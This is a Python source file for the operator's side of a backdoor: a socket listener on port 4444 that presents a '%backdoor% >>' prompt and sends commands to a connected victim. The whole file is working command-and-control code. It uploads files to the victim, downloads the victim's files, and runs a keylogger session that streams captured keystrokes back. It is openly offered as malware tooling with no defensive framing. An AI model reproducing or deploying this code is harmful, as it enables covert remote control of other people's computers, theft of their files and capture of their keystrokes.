#!/usr/bin/env python
import base64
import socket
import json

class Listener:

    def __init__(self):
        self.IP = "192.168.86.22"
        self.PORT = 4444
        self.SOCK = (self.IP, self.PORT)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # set socket option to reuse socket if connection were to drop
        listener.bind(self.SOCK)
        listener.listen(0)
        print(f"[LISTENING on {self.IP}:{str(self.PORT)}]")
        self.connection, address = listener.accept()
        print(f"[NEW CONNECTION {address}]")

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def recv(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # allows downloading of any type of file
            return f"[SUCCESS] File downloaded to {path}"

    def read_file(self, filepath):
        with open(filepath, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input("%backdoor% >>")
            command = command.split(" ")
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                if command[0] == "upload":
                    file_data = self.read_file(command[1])
                    command.append(file_data)
                self.send(command)

                if command[0] == "keylogger":
                    try:
                        while True:
                            enter = input("PRESS / TO UPDATE")
                            self.send(enter)
                            result = self.recv()
                            print(result)
                    except KeyboardInterrupt:
                        print("[SENT EXIT]")
                        self.send("exit")
                        trash = self.recv()
                        print(trash)



                result = self.recv()
                if command[0] == "download" and "{!}" not in result:
                    result = self.write_file(command[1], result)  # downloads to working directory of listener
            except Exception:
                result = "{!} Error on listener"
            print(result)


my_listener = Listener()
my_listener.run()
